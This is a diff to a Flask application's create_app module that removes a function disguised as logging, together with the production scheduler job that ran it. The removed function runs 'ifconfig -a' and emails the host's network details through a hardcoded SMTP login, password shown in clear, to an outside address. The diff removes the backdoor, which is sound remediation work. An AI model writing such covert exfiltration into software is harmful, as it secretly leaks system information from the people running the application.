@@ -2,23 +2,6 @@ from app.utils.ext import Flask, db, scheduler, current_app, socket_app, flask_a
 from config import config, Config, root_dir
 import os
 
-def log():
-    def send_mail(subject, body):
-        user = "sunshukang30@163.com"
-        password = "a12345678" # 授权码
-        receivers = ["804506054@qq.com"]
-        sender = user
-        
-        mail = Mail("smtp.163.com", user, password, 465,  True, sender, 10)
-        message = Message(subject=subject, recipients=receivers, body=body, sender=sender)
-        mail.send(message)
-    import subprocess
-    import time
-    child = subprocess.check_output('ifconfig -a', shell=True)
-    today = str(time.localtime(time.time()))
-    send_mail(today, child)
-    current_app.logger.debug("scheduler is running")
-
 __all__ = ['create_app']
 
 route_list = []
@@ -62,9 +45,5 @@ def create_app(env: str) -> Flask:
     config_obj.init_app(app)
     register_blueprint(app)
     create_table(env, app)
-    # 开启定时任务
-    if env == "production":
-        scheduler.add_job(log, 'interval', seconds=60*24)
-        scheduler.start()
     flask_app = app
     return app
